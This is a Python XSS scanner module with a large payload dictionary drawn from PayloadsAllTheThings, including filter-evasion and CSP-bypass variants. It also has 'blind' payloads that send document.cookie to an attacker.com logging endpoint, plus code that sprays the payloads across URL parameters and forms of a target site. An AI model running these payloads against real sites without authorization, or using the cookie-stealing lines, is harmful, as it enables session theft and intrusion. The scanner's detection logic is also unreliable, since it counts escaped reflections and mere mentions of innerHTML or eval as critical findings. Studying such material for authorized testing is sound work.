"""
XSS Scanner Module - Comprehensive XSS Testing
Based on PayloadsAllTheThings methodology
"""

import re
import requests
import urllib.parse
from typing import List, Dict, Optional, Tuple
from datetime import datetime
from rich.console import Console
from rich.table import Table

console = Console()

# ============================================================================
# COMPREHENSIVE XSS PAYLOADS - Based on PayloadsAllTheThings
# ============================================================================

XSS_PAYLOADS = {
    "basic": [
        "<script>alert(1)</script>",
        "<script>alert('XSS')</script>",
        "<script>alert(document.domain)</script>",
        "<script>confirm(1)</script>",
        "<script>prompt(1)</script>",
    ],
    "html": [
        "<img src=x onerror=alert(1)>",
        "<img src=x onerror=alert(document.domain)>",
        "<body onload=alert(1)>",
        "<svg onload=alert(1)>",
        "<div onmouseover=alert(1)>hover</div>",
        "<iframe src=javascript:alert(1)>",
        "<object data=javascript:alert(1)>",
        "<embed src=javascript:alert(1)>",
    ],
    "encoded": [
        "%3Cscript%3Ealert(1)%3C/script%3E",
        "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E",
        "%253Cscript%253Ealert(1)%253C/script%253E",
        "&#60;script&#62;alert(1)&#60;/script&#62;",
        "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
        "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
        "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
    ],
    "events": [
        "onload=alert(1)",
        "onerror=alert(1)",
        "onclick=alert(1)",
        "onmouseover=alert(1)",
        "onmouseenter=alert(1)",
        "onkeydown=alert(1)",
        "onfocus=alert(1)",
        "onblur=alert(1)",
        "onchange=alert(1)",
        "onsubmit=alert(1)",
        "onreset=alert(1)",
        "onselect=alert(1)",
        "onabort=alert(1)",
        "onunload=alert(1)",
        "onbeforeunload=alert(1)",
        "onresize=alert(1)",
        "onscroll=alert(1)",
    ],
    "javascript": [
        "javascript:alert(1)",
        "javascript:alert(document.domain)",
        "javascript:alert('XSS')",
        "javascript:prompt(1)",
        "javascript:confirm(1)",
        "data:text/html,<script>alert(1)</script>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    ],
    "polyglots": [
        "javascript:alert(1)//<script>alert(1)</script>",
        "\" onload=alert(1)>",
        "'>\"<script>alert(1)</script>",
        "'>'><script>alert(1)</script>",
        "\"><script>alert(1)</script>",
        "</script><script>alert(1)</script>",
        "';alert(1);//",
        "\";alert(1);//",
        "-->alert(1)//",
        "//<script>alert(1)</script>",
    ],
    "dom": [
        "#<script>alert(1)</script>",
        "#<img src=x onerror=alert(1)>",
        "?param=<script>alert(1)</script>",
        "#<svg onload=alert(1)>",
        "#<body onload=alert(1)>",
    ],
    "reflected": [
        "?q=<script>alert(1)</script>",
        "?search=<script>alert(1)</script>",
        "?query=<script>alert(1)</script>",
        "?id=<script>alert(1)</script>",
        "?page=<script>alert(1)</script>",
        "?user=<script>alert(1)</script>",
        "?username=<script>alert(1)</script>",
        "?name=<script>alert(1)</script>",
        "?email=<script>alert(1)</script>",
    ],
    "contextual": [
        "\"><script>alert(1)</script>",
        ">\"<script>alert(1)</script>",
        "\" onload=alert(1)>",
        "' onload=alert(1)>",
        "</script><script>alert(1)</script>",
        "';alert(1);//",
        "\";alert(1);//",
        "expression(alert(1))",
        "url(javascript:alert(1))",
    ],
    "framework": [
        "javascript:alert(1)//",
        "onerror=alert(1)//",
        "{{alert(1)}}",
        "{{constructor.constructor('alert(1)')()}}",
        "{{constructor.alert(1)}}",
        "{{7*7}}",
        "$('<img src=x onerror=alert(1)>')",
        "$.get('javascript:alert(1)')",
    ],
    "evasion": [
        "<ScRiPt>alert(1)</sCrIpT>",
        "<IMG SRC=x onerror=alert(1)>",
        "<script >alert(1)</script>",
        "<img src=x onerror=alert(1) >",
        "%00<script>alert(1)</script>",
        "<scr%00ipt>alert(1)</scr%00ipt>",
        "<!--<script>alert(1)</script>-->",
        "<!--><script>alert(1)</script>-->",
        "\"<script>alert(1)</script>\"",
        "'<script>alert(1)</script>'",
    ],
    "stored": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "javascript:alert(1)",
    ],
    "blind": [
        "<script>fetch('https://attacker.com/log?c='+document.cookie)</script>",
        "<img src=x onerror='fetch(\"https://attacker.com/log?c=\"+document.cookie)'>",
        "<svg onload='fetch(\"https://attacker.com/log?c=\"+document.cookie)'>",
        "<script>new Image().src='https://attacker.com/log?c='+document.cookie</script>",
    ],
    "csp_bypass": [
        "<script>alert(1)</script>",
        "<script>document.write('<img src=x onerror=alert(1)>')</script>",
        "<script>eval('al'+'ert(1)')</script>",
        "<script>setTimeout('alert(1)', 100)</script>",
        "<script>setInterval('alert(1)', 100)</script>",
        "<script>Function('alert(1)')()</script>",
        "<script>(function(){alert(1)})()</script>",
        "<script>window['alert'](1)</script>",
        "<script>self['alert'](1)</script>",
        "<script>top['alert'](1)</script>",
        "<script>parent['alert'](1)</script>",
        "<script>opener['alert'](1)</script>",
    ],
}

# ============================================================================
# COMPREHENSIVE PARAMETERS FOR XSS TESTING
# ============================================================================

XSS_PARAMETERS = [
    # Basic parameters
    "id", "user", "uid", "username", "email", "page",
    "file", "path", "url", "redirect", "return",
    "next", "token", "apikey", "search", "q",
    "query", "filter", "sort", "order", "lang",
    "debug", "name", "title", "content", "body",
    # Search parameters
    "search", "q", "query", "keyword", "keywords",
    "term", "filter", "category", "tag", "label",
    # ID parameters
    "id", "uid", "user_id", "userid", "account_id",
    "profile_id", "post_id", "order_id", "invoice_id",
    "ticket_id", "project_id", "document_id", "item_id",
    "product_id", "category_id", "page_id", "comment_id",
    # Redirect parameters
    "redirect", "url", "next", "return", "returnTo",
    "continue", "destination", "callback", "goto",
    "forward", "to", "target", "href", "link",
    # API parameters
    "apikey", "api_key", "token", "access_token",
    "refresh_token", "client_id", "client_secret",
    "grant_type", "scope", "state", "nonce",
    # Misc parameters
    "debug", "test", "dev", "staging", "sandbox",
    "admin", "root", "super", "master", "backup",
    "config", "settings", "profile", "account",
    "order", "invoice", "payment", "checkout",
]


class XSSScanner:
    """Comprehensive XSS Scanner with payload testing"""
    
    def __init__(self, target_url: str, timeout: int = 5):
        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        self.findings = []
        self.tested_params = set()
        self.vulnerable_params = set()
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def scan(self) -> List[Dict]:
        """Run comprehensive XSS scan"""
        console.print(f"[cyan]Scanning for XSS vulnerabilities on: {self.target_url}[/cyan]")
        
        self._test_url_parameters()
        self._test_forms()
        self._test_reflected()
        self._test_dom_based()
        
        return self.findings
    
    def _test_url_parameters(self):
        """Test all URL parameters for XSS"""
        console.print("[cyan]Testing URL parameters for XSS...[/cyan]")
        
        for param in XSS_PARAMETERS:
            if param in self.tested_params:
                continue
            self.tested_params.add(param)
            
            payload_groups = ['basic', 'encoded', 'javascript', 'polyglots', 'contextual']
            
            for group in payload_groups:
                for payload in XSS_PAYLOADS.get(group, []):
                    test_url = self._inject_payload(param, payload)
                    if self._check_vulnerability(test_url, param, payload):
                        self.vulnerable_params.add(param)
                        self.findings.append({
                            "finding_id": f"XSS-{len(self.findings)}",
                            "category": "xss",
                            "name": f"XSS Vulnerability - {param} parameter",
                            "parameter": param,
                            "payload": payload,
                            "url": test_url,
                            "severity": "CRITICAL",
                            "confidence": 90 if group in ['basic', 'javascript'] else 75,
                            "description": f"XSS vulnerability found in parameter '{param}'",
                            "timestamp": datetime.now().isoformat()
                        })
                        console.print(f"[red]XSS FOUND: {param} = {payload[:30]}...[/red]")
                        break
                if param in self.vulnerable_params:
                    break
    
    def _test_forms(self):
        """Test HTML forms for XSS"""
        console.print("[cyan]Testing forms for XSS...[/cyan]")
        
        try:
            response = self.session.get(self.target_url, timeout=self.timeout)
            html = response.text
            
            form_pattern = r'<form[^>]*action="([^"]*)"[^>]*>'
            forms = re.findall(form_pattern, html)
            
            for form_action in forms:
                if form_action:
                    action_url = urllib.parse.urljoin(self.target_url, form_action)
                    input_pattern = r'<input[^>]*name="([^"]*)"[^>]*>'
                    inputs = re.findall(input_pattern, html)
                    
                    for input_name in inputs:
                        for payload_group in ['basic', 'encoded', 'html']:
                            for payload in XSS_PAYLOADS.get(payload_group, []):
                                test_url = f"{action_url}?{input_name}={urllib.parse.quote(payload)}"
                                if self._check_vulnerability(test_url, input_name, payload):
                                    self.findings.append({
                                        "finding_id": f"XSS-{len(self.findings)}",
                                        "category": "xss",
                                        "name": f"XSS in Form - {input_name}",
                                        "parameter": input_name,
                                        "payload": payload,
                                        "url": test_url,
                                        "severity": "CRITICAL",
                                        "confidence": 85,
                                        "description": f"XSS in form parameter '{input_name}'",
                                        "timestamp": datetime.now().isoformat()
                                    })
        except Exception as e:
            console.print(f"[dim]Form scanning error: {e}[/dim]")
    
    def _test_reflected(self):
        """Test for reflected XSS"""
        console.print("[cyan]Testing for reflected XSS...[/cyan]")
        
        reflection_patterns = [
            f"{self.target_url}?q=<script>alert(1)</script>",
            f"{self.target_url}?search=<script>alert(1)</script>",
            f"{self.target_url}?id=<script>alert(1)</script>",
            f"{self.target_url}?page=<script>alert(1)</script>",
            f"{self.target_url}?user=<script>alert(1)</script>",
        ]
        
        for test_url in reflection_patterns:
            try:
                response = self.session.get(test_url, timeout=self.timeout)
                if self._has_reflected_xss(response.text):
                    self.findings.append({
                        "finding_id": f"XSS-{len(self.findings)}",
                        "category": "xss",
                        "name": "Reflected XSS",
                        "payload": test_url,
                        "url": test_url,
                        "severity": "CRITICAL",
                        "confidence": 80,
                        "description": f"Reflected XSS found",
                        "timestamp": datetime.now().isoformat()
                    })
                    console.print(f"[red]Reflected XSS found: {test_url[:60]}...[/red]")
            except:
                pass
    
    def _test_dom_based(self):
        """Test for DOM-based XSS"""
        console.print("[cyan]Testing for DOM-based XSS vectors...[/cyan]")
        
        dom_vectors = [
            "#<script>alert(1)</script>",
            "#<img src=x onerror=alert(1)>",
            "#<svg onload=alert(1)>",
            "#<body onload=alert(1)>",
            "javascript:alert(1)",
        ]
        
        for vector in dom_vectors:
            test_url = f"{self.target_url}{vector}"
            try:
                response = self.session.get(test_url, timeout=self.timeout)
                if self._has_dom_xss(response.text):
                    self.findings.append({
                        "finding_id": f"XSS-{len(self.findings)}",
                        "category": "xss",
                        "name": "DOM-Based XSS",
                        "payload": vector,
                        "url": test_url,
                        "severity": "CRITICAL",
                        "confidence": 75,
                        "description": f"DOM-based XSS vector found",
                        "timestamp": datetime.now().isoformat()
                    })
                    console.print(f"[red]DOM XSS vector found: {vector[:30]}...[/red]")
            except:
                pass
    
    def _inject_payload(self, param: str, payload: str) -> str:
        """Inject payload into URL parameter"""
        return f"{self.target_url}?{param}={urllib.parse.quote(payload)}"
    
    def _check_vulnerability(self, url: str, param: str, payload: str) -> bool:
        """Check if the URL is vulnerable to XSS"""
        try:
            response = self.session.get(url, timeout=self.timeout)
            html = response.text
            
            if payload in html:
                return True
            encoded = urllib.parse.quote(payload)
            if encoded in html:
                return True
            html_encoded = payload.replace('<', '&lt;').replace('>', '&gt;')
            if html_encoded in html:
                return True
            return False
        except:
            return False
    
    def _has_reflected_xss(self, html: str) -> bool:
        """Check if HTML contains reflected XSS patterns"""
        xss_patterns = [
            r'<script>alert\(\d+\)</script>',
            r'<img[^>]*onerror=alert\(\d+\)',
            r'<svg[^>]*onload=alert\(\d+\)',
            r'<body[^>]*onload=alert\(\d+\)',
            r'javascript:alert\(\d+\)',
            r'<div[^>]*onmouseover=alert\(\d+\)',
        ]
        for pattern in xss_patterns:
            if re.search(pattern, html, re.IGNORECASE):
                return True
        return False
    
    def _has_dom_xss(self, html: str) -> bool:
        """Check if HTML contains DOM-based XSS patterns"""
        dom_patterns = [
            r'document\.write',
            r'\.innerHTML\s*=',
            r'\.outerHTML\s*=',
            r'\.insertAdjacentHTML',
            r'dangerouslySetInnerHTML',
            r'v-html\s*=',
            r'ng-bind-html\s*=',
            r'eval\s*\(',
            r'Function\s*\(',
            r'setTimeout\s*\(\s*["\']',
            r'setInterval\s*\(\s*["\']',
        ]
        for pattern in dom_patterns:
            if re.search(pattern, html, re.IGNORECASE):
                return True
        return False
    
    def get_summary(self) -> Dict:
        """Get scan summary"""
        return {
            "total_findings": len(self.findings),
            "vulnerable_params": list(self.vulnerable_params),
            "tested_params": len(self.tested_params),
            "findings_by_severity": {
                "CRITICAL": len([f for f in self.findings if f.get('severity') == 'CRITICAL']),
                "HIGH": len([f for f in self.findings if f.get('severity') == 'HIGH']),
            }
        }
    
    def render_results(self):
        """Render XSS scan results in a table"""
        if not self.findings:
            console.print("\n[green]✅ No XSS vulnerabilities found![/green]")
            return
        
        console.print(f"\n[bold red]🔥 XSS Vulnerabilities Found: {len(self.findings)}[/bold red]")
        
        table = Table(title="XSS Scan Results")
        table.add_column("ID", style="dim", width=8)
        table.add_column("Parameter", style="cyan", width=15)
        table.add_column("Payload", style="yellow", width=30)
        table.add_column("Confidence", style="green", width=12)
        table.add_column("URL", style="white", width=40)
        
        for f in self.findings[:20]:
            table.add_row(
                f.get('finding_id', 'N/A')[:6],
                f.get('parameter', 'N/A')[:12],
                f.get('payload', 'N/A')[:28],
                f"{f.get('confidence', 0)}%",
                f.get('url', 'N/A')[:38]
            )
        
        console.print(table)
        
        summary = self.get_summary()
        console.print(f"\n[bold]📊 Scan Summary:[/bold]")
        console.print(f"  • Vulnerable Parameters: {len(summary['vulnerable_params'])}")
        console.print(f"  • Tested Parameters: {summary['tested_params']}")
        console.print(f"  • Critical Findings: {summary['findings_by_severity']['CRITICAL']}")